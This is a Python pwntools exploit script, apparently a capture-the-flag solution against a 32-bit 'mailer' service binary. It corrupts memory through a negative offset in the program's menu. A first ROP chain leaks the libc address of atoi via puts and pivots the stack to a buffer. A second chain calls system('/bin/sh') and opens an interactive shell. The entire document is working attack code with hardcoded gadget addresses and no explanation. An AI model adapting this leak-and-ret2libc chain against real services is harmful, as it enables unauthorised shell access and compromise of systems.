#!/usr/bin/env python
# -*- coding: utf-8 -*-
from pwn import *

if len(sys.argv) > 1:
    r = remote('', )
else:
    r = remote('127.0.0.1', 4444)

code = ELF('./mailer_')
libc = ELF('./bc.so.6')
context.arch = code.arch
context.log_level = 'debug'

def add(content):
    r.sendlineafter('> ', '1')
    r.sendlineafter(': ', content)

def delete(i):
    r.sendlineafter('> ', '2')
    r.sendlineafter(': ', str(i))

def post(i, offset):
    r.sendlineafter('> ', '3')
    r.sendlineafter(': ', str(i))
    r.sendlineafter('> ', str(offset))

buf = 0x804bf00
read = 0x80486d9
pop3_ret = 0x08048da9 # ebp
pop2_ret = 0x8048daa
pop_ret = 0x08048495
leave_ret = 0x080485f8
p = flat( # 1st rop
        code.plt['puts'], # puts atoi.got
        pop_ret,
        code.got['atoi'],
        read, # read buf 32, 2nd rop chain
        pop3_ret, 
        buf, 
        100,
        buf,
        leave_ret # stack migration to the buf
        )
for i in range(5):
    add('AAAA')

post(4, -15) # setbuf to mail[4]

delete(0)

add('A'*134)
post(0, 0)
delete(0)
add('A'*134)
post(0, 0)
delete(0)
add(p)
post(0, 0)

r.sendlineafter('> ', '4') # Quit -> rop2
r.recvuntil(':)\n')
leak = r.recv(4)
libc.address = u32(leak) - libc.sym['atoi']
print hex(libc.address)
system = libc.sym['system']
bin_sh = libc.search('/bin/sh').next()
print hex(bin_sh)

p = flat(
        'AAAA',  
        system, 
        'BBBB',
        bin_sh
        )

r.sendline(p)
r.interactive()
